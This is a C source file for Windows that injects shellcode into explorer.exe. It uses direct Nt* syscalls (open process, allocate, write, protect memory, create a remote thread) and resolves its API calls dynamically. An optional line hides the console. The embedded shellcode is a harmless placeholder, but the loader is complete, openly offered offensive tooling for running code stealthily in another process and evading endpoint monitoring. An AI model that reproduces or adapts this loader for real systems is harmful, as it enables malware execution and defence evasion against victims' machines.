#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include "syscall.h"
#include <TlHelp32.h>
#pragma comment (lib, "dbghelp.lib") 
#pragma section(".text")
/*
programmer : MrBlackZero
github page: https://github.com/MrBlackZero
tested : windows 11 - windows 10 
*/
_declspec(allocate(".text"))UCHAR ShellCode[] = "\x90\x90\x90\x90\x90\xcc\xcc\xcc\xc3";
SIZE_T ShellCodeSize= _countof(ShellCode);

typedef BOOL(WINAPI* CloseHandleEx)(HANDLE hObject);
typedef HANDLE(WINAPI* CreateToolhelp32SnapshotEx)(DWORD dwFlags, DWORD th32ProcessID);
typedef BOOL(WINAPI* Process32FirstEx)(HANDLE hSnapshot,LPPROCESSENTRY32W lppe);
typedef BOOL(WINAPI* Process32NextEx)(HANDLE hSnapshot,LPPROCESSENTRY32W lppe);
int FindProcess(LPCWSTR arg_procname)
{
	HMODULE hKernel32 = LoadLibraryW(L"KERNEL32.DLL");
	CreateToolhelp32SnapshotEx pCreateToolhelp32Snapshot = (CreateToolhelp32SnapshotEx)GetProcAddress(hKernel32, "CreateToolhelp32Snapshot");
	Process32FirstEx pProcess32First = (Process32FirstEx)GetProcAddress(hKernel32, "Process32FirstW");
	Process32NextEx pProcess32Next = (Process32NextEx)GetProcAddress(hKernel32, "Process32NextW");
	CloseHandleEx pCloseHandle = (CloseHandleEx)GetProcAddress(hKernel32, "CloseHandle");
	int PID = 0;
	
	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hSnapshotProcess = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (pProcess32First(hSnapshotProcess, &processEntry) == TRUE) {
		do
		{
			if (wcscmp(processEntry.szExeFile, arg_procname) == 0) {
				PID = processEntry.th32ProcessID;
				break;
			}

		} while (pProcess32Next(hSnapshotProcess, &processEntry) == TRUE);
	}
	pCloseHandle(hSnapshotProcess);
	return PID;
	}

int main(){

	//FreeConsole(); -> Hide Console 
	int pid = FindProcess(L"explorer.exe");
	if (pid == 0) {
		perror("[Error] Process NotFound");
		return EXIT_FAILURE;
	}
	CLIENT_ID CLID = {NULL};
	OBJECT_ATTRIBUTES obj_attr;
	HANDLE hProc = NULL;
	InitializeObjectAttributes(&obj_attr, NULL, NULL, NULL, NULL);
	CLID.UniqueProcess = (HANDLE)pid;
	CLID.UniqueThread = (HANDLE)0;
	__try {
		NtOpenProcess(&hProc, MAXIMUM_ALLOWED, &obj_attr, &CLID);
		LPVOID alloc_shellcode = NULL;
		NtAllocateVirtualMemory(hProc, &alloc_shellcode, NULL, &ShellCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		NtWriteVirtualMemory(hProc, alloc_shellcode, ShellCode, ShellCodeSize, NULL);
		ULONG OldAccess = NULL;
		NtProtectVirtualMemory(hProc, &alloc_shellcode, &ShellCodeSize, PAGE_EXECUTE_READ, &OldAccess);
		HANDLE hThread = 0;
		NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProc, alloc_shellcode, NULL, NULL,0,NULL,NULL,NULL);
		if (hThread) {
			WaitForSingleObject(hThread, INFINITE);
			CloseHandle(hThread);
		}
	}__except (EXCEPTION_ACCESS_VIOLATION, EXCEPTION_EXECUTE_HANDLER) {
		printf("[ERROR] %x\n", GetLastError());
	}
	return EXIT_SUCCESS;
}
